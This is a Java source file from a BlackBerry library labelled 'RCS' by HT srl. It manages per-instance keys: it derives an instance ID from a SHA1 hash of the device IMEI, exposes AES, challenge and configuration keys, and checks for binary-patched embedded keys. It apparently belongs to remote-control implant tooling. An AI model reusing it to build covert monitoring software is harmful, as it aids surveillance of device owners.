//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Keys.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.config;

import net.rim.device.api.system.GPRSInfo;
import blackberry.crypto.Encryption;
import blackberry.interfaces.Singleton;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Keys.
 */
public final class Keys implements Singleton {
   
    static Keys instance = null;

    static InstanceKeys instanceKeys;
    
    /**
     * Gets the single instance of Keys.
     * 
     * @return single instance of Keys
     */
    public static synchronized Keys getInstance() {
        if (instance == null) {
            instance = new Keys();
        }

        return instance;
    };

    /**
     * Checks for been binary patched.
     * 
     * @return true, if successful
     */
    public static boolean hasBeenBinaryPatched() {
        return instanceKeys.hasBeenBinaryPatched();
    }        

    private Keys() {
        final byte[] imei = GPRSInfo.getIMEI();
        
        byte[] byteInstanceID = Encryption.SHA1(imei);
        String instanceID = Utils.byteArrayToHex(byteInstanceID);
        
        instanceKeys=new InstanceKeys(byteInstanceID, instanceID);
    }
    
    public void setInstanceKeys(InstanceKeysEmbedded embeddedKeys){
        embeddedKeys.injectKeys(instanceKeys);
    }
    
    public InstanceKeys getInstanceKeys(){
        return instanceKeys;
    }

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getAesKey() {
        return instanceKeys.getAesKey();
    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildId() {
        return instanceKeys.getBuildId();
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getChallengeKey() {
        return instanceKeys.getChallengeKey();
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        return instanceKeys.getConfKey();
    }

    /**
     * Gets the conf name key.
     * 
     * @return the conf name key
     */
    public byte[] getConfNameKey() {
        return instanceKeys.getConfNameKey();
    }

    /**
     * Gets the instance id.
     * 
     * @return the instance id
     */
    public byte[] getInstanceId() {
        return instanceKeys.getInstanceId();
    }

}